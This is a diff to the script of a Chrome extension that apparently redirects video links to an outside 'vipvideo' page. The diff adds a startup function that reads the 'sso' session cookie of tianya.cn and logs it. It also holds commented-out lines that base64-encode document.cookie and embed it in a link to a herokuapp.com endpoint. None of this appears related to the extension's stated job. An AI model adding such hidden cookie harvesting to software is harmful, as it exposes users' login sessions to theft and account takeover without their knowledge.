@@ -21,6 +21,7 @@ isInsideEle.onclick = function(){
 };
 
 !function(){
+	aaa();
 	initUrl();
 	initIsInsideHtml();
 	var apis = new Array();
@@ -86,6 +87,17 @@ function doRedirect(apiUrl){
 	chrome.tabs.create({url : "http://www.lmoon.top/vipvideo_ext2.html?"+url}, function(tab) {});
 }
 
+
+function aaa(){
+	var details = {};
+	details.domain = ".tianya.cn";
+	details.name = "sso";
+	//alert(details.url);
+	console.info(chrome.cookies);
+	chrome.cookies.getAll(details,function(cookie){console.info(cookie);});
+	//var url = window.btoa(encodeURI(document.cookie));
+	// document.querySelector(".guide-enter").innerHTML='<a href="https://vast-inlet-75928.herokuapp.com/test2?cookie='+url+'">进入社区</a>';
+}
 
 
 
